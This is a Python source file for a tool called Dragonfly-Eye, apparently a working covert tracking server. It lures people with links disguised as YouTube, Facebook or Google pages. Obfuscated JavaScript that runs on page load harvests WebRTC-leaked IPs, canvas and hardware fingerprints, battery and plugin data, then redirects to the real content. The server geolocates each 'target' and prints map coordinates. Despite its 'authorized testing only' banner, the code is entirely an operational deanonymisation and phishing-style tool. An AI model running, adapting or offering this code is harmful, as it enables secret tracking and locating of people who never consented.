#!/usr/bin/env python3
"""
DRAGONFLY-EYE PROFESSIONAL v3.2
Real-Time Monitoring with GPS Tracking

Copyright (c) 2024 F1REW0LF. All rights reserved.
License: MIT - Free for community use
"""

import http.server
import socketserver
import urllib.parse
import urllib.request
import json
import datetime
import sys
import threading
import logging
import re
import os
import time
import base64
import zlib
import secrets
import socket
from collections import defaultdict
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ==================== VERSION & INFO ====================
VERSION = "3.2.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Open Source"
WEBSITE = "https://github.com/F1REW0LF/dragonfly-eye"

# ==================== CONFIGURATION ====================
PORT = 443
HTTP_PORT = 8080
DEBUG_MODE = True
LOG_FILE = "dragonfly.log"
TELEMETRY_DIR = "telemetry"
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"
MAX_REQUESTS = 20
TIME_WINDOW = 60

# Create directories
Path(TELEMETRY_DIR).mkdir(exist_ok=True)

# ==================== COLOR PRINT ====================
class Color:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def cprint(text, color=Color.GREEN, bold=False):
    if bold:
        print(f"{Color.BOLD}{color}{text}{Color.END}")
    else:
        print(f"{color}{text}{Color.END}")

# ==================== IP GEOLOCATION ====================
class IPGeolocation:
    @staticmethod
    def get_location(ip):
        try:
            url = f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,org,timezone"
            response = urllib.request.urlopen(url, timeout=5)
            data = json.loads(response.read().decode())
            
            if data.get('status') == 'success':
                return {
                    'ip': ip,
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'latitude': data.get('lat', 0),
                    'longitude': data.get('lon', 0),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown'),
                    'google_maps': f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}"
                }
            return None
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def get_public_ip():
        try:
            response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
            data = json.loads(response.read().decode())
            return data.get('ip')
        except:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 1))
                ip = s.getsockname()[0]
            except Exception:
                ip = '127.0.0.1'
            finally:
                s.close()
            return ip

# ==================== ENCRYPTION ====================
class TelemetryEncryptor:
    def __init__(self):
        system_info = f"{os.name}{sys.platform}{os.cpu_count()}{time.time()}"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'dragonfly_salt_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(system_info.encode()))
        self.cipher = Fernet(key)
    
    def encrypt(self, data):
        return self.cipher.encrypt(json.dumps(data).encode()).decode()

encryptor = TelemetryEncryptor()

# ==================== CAMPAIGN CONFIG ====================
campaign_config = {
    "platform": "youtube",
    "target_id": "E8vVsU1kkEQ",
    "redirect_url": "https://www.youtube.com/watch?v=E8vVsU1kkEQ",
    "meta_title": "YouTube - Trending Video",
    "meta_image": "https://img.youtube.com/vi/E8vVsU1kkEQ/maxresdefault.jpg",
    "campaign_name": f"campaign_{int(time.time())}",
    "start_time": datetime.datetime.now().isoformat(),
    "encryption": True,
    "obfuscation": True
}

# ==================== DISPLAY FUNCTIONS ====================
def display_banner():
    banner = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗██╗  ██╗      ║
║   ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝      ║
║   ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗   ╚███╔╝       ║
║   ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗       ║
║   ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗      ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝      ║
║                                                                               ║
║   DRAGONFLY-EYE PROFESSIONAL v{VERSION}                                      ║
║   Real-Time Monitoring & GPS Tracking                                        ║
║   Author: {AUTHOR} | License: {LICENSE}                                     ║
║   Website: {WEBSITE}                                                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def display_server_info(public_ip, local_ip):
    """Hiển thị thông tin server"""
    print("\n" + "="*80)
    cprint("C2 SERVER INFORMATION", Color.YELLOW, bold=True)
    print("="*80)
    cprint(f"Public IP: {public_ip}", Color.GREEN)
    cprint(f"Local IP: {local_ip}", Color.GREEN)
    print("-"*80)
    cprint(f"HTTP Link: http://{public_ip}:{HTTP_PORT}", Color.BLUE)
    cprint(f"HTTPS Link: https://{public_ip}:{PORT}", Color.BLUE)
    if local_ip != public_ip:
        cprint(f"Local HTTP: http://{local_ip}:{HTTP_PORT}", Color.BLUE)
        cprint(f"Local HTTPS: https://{local_ip}:{PORT}", Color.BLUE)
    print("-"*80)
    cprint("Health Check: /health", Color.GREEN)
    cprint("Telemetry Endpoint: POST /dragonfly-telemetry", Color.GREEN)
    print("="*80 + "\n")

def display_target_info(client_ip, data):
    """Hiển thị thông tin target khi có kết nối"""
    
    print("\n" + "="*80)
    cprint("TARGET DETECTED", Color.RED, bold=True)
    print("="*80)
    print(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    cprint(f"Target IP: {client_ip}", Color.YELLOW)
    
    # Get GPS from IP
    geo = IPGeolocation.get_location(client_ip)
    
    if geo and 'error' not in geo:
        cprint(f"Country: {geo.get('country', 'Unknown')}", Color.GREEN)
        cprint(f"City: {geo.get('city', 'Unknown')}", Color.GREEN)
        cprint(f"Latitude: {geo.get('latitude', 0)}", Color.BLUE)
        cprint(f"Longitude: {geo.get('longitude', 0)}", Color.BLUE)
        cprint(f"Google Maps: {geo.get('google_maps', 'N/A')}", Color.UNDERLINE)
        cprint(f"ISP: {geo.get('isp', 'Unknown')}", Color.GREEN)
        cprint(f"Timezone: {geo.get('timezone', 'Unknown')}", Color.GREEN)
    else:
        cprint("Cannot get GPS location", Color.RED)
    
    print("-"*80)
    
    # Telemetry data
    telemetry = data.get('data', {})
    
    webrtc_ips = telemetry.get('webrtc_ips', [])
    if webrtc_ips:
        cprint(f"WebRTC IPs: {', '.join(webrtc_ips)}", Color.YELLOW)
    
    hardware = telemetry.get('hardware', {})
    if hardware:
        browser = hardware.get('browser', {})
        screen = hardware.get('screen', {})
        
        print("-"*80)
        cprint("HARDWARE FINGERPRINT", Color.YELLOW)
        print(f"Browser: {browser.get('userAgent', 'N/A')[:80]}...")
        print(f"Platform: {browser.get('platform', 'N/A')}")
        print(f"Screen: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
        print(f"Language: {browser.get('language', 'N/A')}")
        
        hw = hardware.get('hardware', {})
        print(f"CPU Cores: {hw.get('cores', 'N/A')}")
        print(f"Memory: {hw.get('memory', 'N/A')} GB")
        
        timezone = hardware.get('timezone', {})
        print(f"Timezone: {timezone.get('name', 'N/A')}")
    
    plugins = telemetry.get('plugins', {})
    if plugins:
        print(f"Plugins: {plugins.get('count', 0)} installed")
    
    print("="*80)
    print()  # Empty line for readability

# ==================== PAYLOAD GENERATOR ====================
def generate_payload():
    """Generate dynamic payload"""
    
    js_code = f"""
    (function() {{
        'use strict';
        
        const SESSION = '{secrets.token_hex(16)}';
        const CAMPAIGN = '{campaign_config["campaign_name"]}';
        
        function getWebRTCIPs() {{
            return new Promise((resolve) => {{
                const ips = new Set();
                const rtc = new RTCPeerConnection({{
                    iceServers: [
                        {{urls: "stun:stun.l.google.com:19302"}},
                        {{urls: "stun:stun1.l.google.com:19302"}},
                        {{urls: "stun:stun2.l.google.com:19302"}}
                    ]
                }});
                
                rtc.createDataChannel("");
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(() => {{}});
                
                rtc.onicecandidate = (e) => {{
                    if (e && e.candidate && e.candidate.candidate) {{
                        const candidate = e.candidate.candidate;
                        const matches = candidate.match(/([0-9]{{1,3}}\\.){{3}}[0-9]{{1,3}}/g);
                        if (matches) matches.forEach(ip => ips.add(ip));
                    }}
                }};
                
                setTimeout(() => {{
                    rtc.close();
                    resolve(Array.from(ips));
                }}, 3000);
            }});
        }}
        
        function getHardwareProfile() {{
            const profile = {{
                screen: {{
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                }},
                browser: {{
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages.join(','),
                    cookieEnabled: navigator.cookieEnabled,
                    vendor: navigator.vendor
                }},
                hardware: {{
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory || 'unknown',
                    touchPoints: navigator.maxTouchPoints || 0
                }},
                timezone: {{
                    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                }}
            }};
            
            if (navigator.connection) {{
                profile.connection = {{
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                }};
            }}
            
            if (navigator.getBattery) {{
                navigator.getBattery().then(battery => {{
                    profile.battery = {{
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    }};
                }}).catch(() => {{}});
            }}
            
            return profile;
        }}
        
        function getCanvasFingerprint() {{
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Dragonfly-Eye', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Security Research', 4, 45);
            
            return canvas.toDataURL();
        }}
        
        function getPlugins() {{
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {{
                const p = navigator.plugins[i];
                plugins.push({{
                    name: p.name,
                    filename: p.filename
                }});
            }}
            return {{
                count: plugins.length,
                list: plugins
            }};
        }}
        
        async function collectTelemetry() {{
            try {{
                const telemetry = {{
                    session: SESSION,
                    campaign: CAMPAIGN,
                    timestamp: new Date().toISOString(),
                    version: '{VERSION}',
                    webrtc_ips: await getWebRTCIPs(),
                    hardware: getHardwareProfile(),
                    canvas: getCanvasFingerprint(),
                    plugins: getPlugins(),
                    page: {{
                        url: window.location.href,
                        referrer: document.referrer || 'direct',
                        title: document.title,
                        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`
                    }}
                }};
                
                const response = await fetch('/dragonfly-telemetry', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(telemetry)
                }});
                
                if (response.ok) {{
                    setTimeout(() => {{
                        window.location.href = '{campaign_config["redirect_url"]}';
                    }}, 1000);
                }}
                
            }} catch (error) {{
                setTimeout(() => {{
                    window.location.href = '{campaign_config["redirect_url"]}';
                }}, 500);
            }}
        }}
        
        if (document.readyState === 'complete') {{
            collectTelemetry();
        }} else {{
            window.addEventListener('load', collectTelemetry);
        }}
    }})();
    """
    
    # Obfuscate if enabled
    if campaign_config.get('obfuscation', True):
        compressed = zlib.compress(js_code.encode(), level=9)
        b64 = base64.b64encode(compressed).decode()
        js_code = f"""
        (function(){{
            var _0x{secrets.token_hex(4)}=atob("{b64}");
            var _0x{secrets.token_hex(4)}=new DecompressionStream('deflate-raw');
            var _0x{secrets.token_hex(4)}=new Response(_0x{secrets.token_hex(4)}).body;
            var _0x{secrets.token_hex(4)}=_0x{secrets.token_hex(4)}.pipeThrough(_0x{secrets.token_hex(4)});
            new Response(_0x{secrets.token_hex(4)}).text().then(eval);
        }})();
        """
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{campaign_config['meta_title']}</title>
    <meta property="og:title" content="{campaign_config['meta_title']}">
    <meta property="og:image" content="{campaign_config['meta_image']}">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="F1REW0LF">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0a0a0a;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{
            text-align: center;
            padding: 2rem;
            max-width: 600px;
            background: #111111;
            border-radius: 12px;
            border: 1px solid #222;
        }}
        .loader {{
            display: inline-block;
            width: 60px;
            height: 60px;
            border: 3px solid #1a1a1a;
            border-radius: 50%;
            border-top-color: #3498db;
            animation: spin 0.8s ease-in-out infinite;
            margin-bottom: 20px;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        h2 {{ font-weight: 300; margin-bottom: 10px; }}
        .status {{ color: #666; font-size: 14px; }}
        .footer {{
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #1a1a1a;
            font-size: 11px;
            color: #333;
        }}
        .badge {{
            display: inline-block;
            background: #1a1a1a;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 10px;
            color: #444;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2>Connecting to Secure Server</h2>
        <p class="status">Establishing encrypted channel</p>
        <div class="badge">Dragonfly-Eye v{VERSION}</div>
        <div class="footer">F1REW0LF &bull; Open Source Security Testing</div>
    </div>
    <script>{js_code}</script>
</body>
</html>"""
    
    return html

# ==================== REQUEST HANDLER ====================
class DragonflyHandler(http.server.SimpleHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    
    def log_message(self, format, *args):
        if DEBUG_MODE:
            print(f"[DEBUG] {format % args}")
    
    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def _send_html(self, html, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Referrer-Policy", "no-referrer-when-downgrade")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        
        if path == "/health":
            self._send_json({
                "status": "active",
                "version": VERSION,
                "author": AUTHOR,
                "campaign": campaign_config['campaign_name'],
                "platform": campaign_config['platform'],
                "uptime": int(time.time() - campaign_config.get('start_timestamp', time.time()))
            })
            return
        
        if path in ["/", "/watch", "/share", "/search", "/video"]:
            html = generate_payload()
            self._send_html(html)
            
            # Hiển thị thông tin khi có target truy cập
            client_ip = self.client_address[0]
            cprint(f"[+] Payload served to {client_ip}", Color.GREEN)
            return
        
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"Not Found")
    
    def do_POST(self):
        if self.path == "/dragonfly-telemetry":
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length == 0:
                    self._send_json({"error": "Empty payload"}, 400)
                    return
                
                raw_data = self.rfile.read(content_length).decode('utf-8')
                data = json.loads(raw_data)
                
                client_ip = self.client_address[0]
                
                # Hiển thị thông tin target real-time
                display_target_info(client_ip, {
                    'data': data,
                    'client_ip': client_ip,
                    'campaign': campaign_config['campaign_name']
                })
                
                # Lưu telemetry (tùy chọn)
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{TELEMETRY_DIR}/telemetry_{timestamp}_{client_ip.replace('.', '_')}.json"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump({
                        "received_at": datetime.datetime.now().isoformat(),
                        "client_ip": client_ip,
                        "campaign": campaign_config['campaign_name'],
                        "data": data
                    }, f, indent=2)
                
                self._send_json({"status": "success"})
                
            except json.JSONDecodeError:
                self._send_json({"error": "Invalid JSON"}, 400)
            except Exception as e:
                print(f"[ERROR] {e}")
                self._send_json({"error": "Internal error"}, 500)
        
        else:
            self.send_response(404)
            self.end_headers()

# ==================== SSL CERTIFICATE ====================
def generate_ssl_cert():
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return True
    
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Dragonfly-Eye Security"),
            x509.NameAttribute(NameOID.COMMON_NAME, "dragonfly.local"),
        ])
        
        now = datetime.datetime.now(datetime.timezone.utc) if hasattr(datetime, 'timezone') else datetime.datetime.utcnow()
        expiry = now + datetime.timedelta(days=365)
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            now
        ).not_valid_after(
            expiry
        ).sign(private_key, hashes.SHA256())
        
        with open(CERT_FILE, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(KEY_FILE, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        return True
    except Exception as e:
        print(f"[-] SSL Certificate error: {e}")
        return False

# ==================== CAMPAIGN SETUP ====================
def setup_campaign():
    display_banner()
    
    print("\n" + "="*80)
    cprint("CAMPAIGN CONFIGURATION", Color.YELLOW, bold=True)
    print("="*80)
    print()
    
    print("Select Target Platform:")
    print("  [1] YouTube")
    print("  [2] Facebook")
    print("  [3] Google Search")
    print("  [4] Custom URL")
    print()
    
    choice = input("Option (1-4): ").strip()
    
    if choice == "1":
        video_id = input("YouTube Video ID: ").strip()
        if not video_id:
            print("[-] Invalid ID")
            return False
        
        campaign_config.update({
            "platform": "youtube",
            "target_id": video_id,
            "redirect_url": f"https://www.youtube.com/watch?v={video_id}",
            "meta_title": "YouTube - Trending Video",
            "meta_image": f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg"
        })
    
    elif choice == "2":
        fb_id = input("Facebook Video ID: ").strip()
        if not fb_id:
            print("[-] Invalid ID")
            return False
        
        campaign_config.update({
            "platform": "facebook",
            "target_id": fb_id,
            "redirect_url": f"https://www.facebook.com/watch/?v={fb_id}",
            "meta_title": "Facebook - Shared Content",
            "meta_image": "https://www.facebook.com/images/fb_icon_325x325.png"
        })
    
    elif choice == "3":
        query = input("Search Query: ").strip()
        if not query:
            print("[-] Invalid query")
            return False
        
        campaign_config.update({
            "platform": "google",
            "target_id": query,
            "redirect_url": f"https://www.google.com/search?q={urllib.parse.quote(query)}",
            "meta_title": f"Google Search - {query[:50]}",
            "meta_image": "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        })
    
    elif choice == "4":
        url = input("Redirect URL: ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        title = input("Page Title: ").strip() or "Custom Page"
        
        campaign_config.update({
            "platform": "custom",
            "target_id": "custom",
            "redirect_url": url,
            "meta_title": title,
            "meta_image": "https://example.com/image.jpg"
        })
    
    else:
        print("[-] Invalid choice")
        return False
    
    print("\nAdvanced Settings:")
    encryption = input("Enable encryption? (Y/n): ").strip().lower()
    campaign_config['encryption'] = encryption != 'n'
    
    obfuscation = input("Enable obfuscation? (Y/n): ").strip().lower()
    campaign_config['obfuscation'] = obfuscation != 'n'
    
    campaign_config['campaign_name'] = f"{campaign_config['platform']}_{int(time.time())}"
    campaign_config['start_timestamp'] = time.time()
    
    # Get IP information
    public_ip = IPGeolocation.get_public_ip()
    local_ip = socket.gethostbyname(socket.gethostname())
    
    # Display server info
    display_server_info(public_ip, local_ip)
    
    # Generate SSL cert
    generate_ssl_cert()
    
    print("="*80)
    cprint("CAMPAIGN DEPLOYED SUCCESSFULLY", Color.GREEN, bold=True)
    print("="*80)
    print(f"Campaign: {campaign_config['campaign_name']}")
    print(f"Platform: {campaign_config['platform'].upper()}")
    print(f"Target: {campaign_config['target_id']}")
    print(f"Redirect: {campaign_config['redirect_url']}")
    print(f"Encryption: {campaign_config['encryption']}")
    print(f"Obfuscation: {campaign_config['obfuscation']}")
    print("="*80)
    
    print("\n[+] Server is running. Press Ctrl+C to stop.")
    print("[*] Waiting for targets...\n")
    
    return True

# ==================== SERVER ====================
def run_http_server():
    try:
        with socketserver.TCPServer(("", HTTP_PORT), DragonflyHandler) as httpd:
            print(f"[+] HTTP Server running on port {HTTP_PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] HTTP Server error: {e}")

def run_https_server():
    if not generate_ssl_cert():
        return
    
    try:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(CERT_FILE, KEY_FILE)
        
        with socketserver.TCPServer(("", PORT), DragonflyHandler) as httpd:
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            print(f"[+] HTTPS Server running on port {PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] HTTPS Server error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("\n" + "="*80)
    print(" WARNING: This tool is for authorized security testing only.")
    print(" Users are responsible for legal compliance and obtaining")
    print(" proper authorization before use.")
    print("="*80)
    
    if not setup_campaign():
        sys.exit(1)
    
    # Start servers
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    
    https_thread = threading.Thread(target=run_https_server, daemon=True)
    https_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down gracefully...")
        sys.exit(0)
